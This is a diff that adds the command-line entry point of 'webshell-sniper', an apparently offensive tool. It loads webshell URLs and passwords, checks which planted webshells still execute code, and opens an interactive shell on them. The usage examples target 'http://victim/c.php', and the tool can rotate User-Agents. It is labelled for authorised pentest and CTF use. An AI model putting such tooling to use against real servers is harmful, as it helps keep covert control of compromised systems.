@@ -1,0 +1,104 @@
+"""Command-line entry point: parse args, build webshells, launch the REPL."""
+
+from __future__ import annotations
+
+import argparse
+import json
+import sys
+from pathlib import Path
+
+from . import __version__, log
+from .config import Config
+from .core.webshell import WebShell
+from .repl import Repl
+
+EPILOG = """\
+examples:
+  webshell-sniper http://victim/c.php POST s3cr3t
+  webshell-sniper --proxy http://127.0.0.1:8080 http://victim/c.php POST s3cr3t
+  webshell-sniper -f webshells.json
+
+Use only against systems you are authorised to test.
+"""
+
+
+def _build_parser() -> argparse.ArgumentParser:
+    parser = argparse.ArgumentParser(
+        prog="webshell-sniper",
+        description="A webshell manager via terminal (authorised pentest / CTF use only).",
+        epilog=EPILOG,
+        formatter_class=argparse.RawDescriptionHelpFormatter,
+    )
+    parser.add_argument("target", nargs="*", help="URL METHOD PASSWORD (or a single .json file)")
+    parser.add_argument("-f", "--file", help="load webshells from a JSON file")
+    parser.add_argument("--timeout", type=float, default=15.0, help="HTTP timeout (default 15s)")
+    parser.add_argument("--proxy", help="proxy URL, e.g. http://127.0.0.1:8080")
+    parser.add_argument(
+        "--insecure", action="store_true", help="do not verify TLS certificates"
+    )
+    parser.add_argument("--user-agent", help="fixed User-Agent (default: rotate a small pool)")
+    parser.add_argument(
+        "-o", "--output-dir", type=Path, default=Path.cwd(),
+        help="where downloads and logs are written (default: cwd)",
+    )
+    parser.add_argument("--version", action="version", version=f"%(prog)s {__version__}")
+    return parser
+
+
+def _load_configs(args: argparse.Namespace) -> list[dict[str, str]]:
+    """Resolve CLI args into a list of {url, method, password} dicts."""
+    json_path = args.file
+    if not json_path and len(args.target) == 1 and args.target[0].endswith(".json"):
+        json_path = args.target[0]
+
+    if json_path:
+        return json.loads(Path(json_path).read_text())
+    if len(args.target) == 3:
+        url, method, password = args.target
+        return [{"url": url, "method": method, "password": password}]
+    return []
+
+
+def main(argv: list[str] | None = None) -> int:
+    parser = _build_parser()
+    args = parser.parse_args(argv)
+
+    configs = _load_configs(args)
+    if not configs:
+        parser.print_help()
+        return 1
+
+    config = Config(
+        timeout=args.timeout,
+        proxy=args.proxy,
+        verify_ssl=not args.insecure,
+        user_agent=args.user_agent,
+        output_dir=args.output_dir,
+    )
+    config.output_dir.mkdir(parents=True, exist_ok=True)
+
+    webshells: list[WebShell] = []
+    seen: set[str] = set()
+    for entry in configs:
+        ws = WebShell(entry["url"], entry["method"], entry["password"], config)
+        log.info(f"Checking {ws} ...")
+        if ws.url in seen:
+            log.warning("Duplicate URL, skipping.")
+            continue
+        if ws.connect():
+            log.success("Webshell is alive.")
+            webshells.append(ws)
+            seen.add(ws.url)
+        else:
+            log.error("Webshell does not respond / does not execute code.")
+
+    if not webshells:
+        log.error("No working webshells, exiting.")
+        return 2
+
+    log.success(f"{len(webshells)} webshell(s) online. Entering interactive mode.")
+    return Repl(webshells, config).cmdloop() or 0
+
+
+if __name__ == "__main__":
+    sys.exit(main())
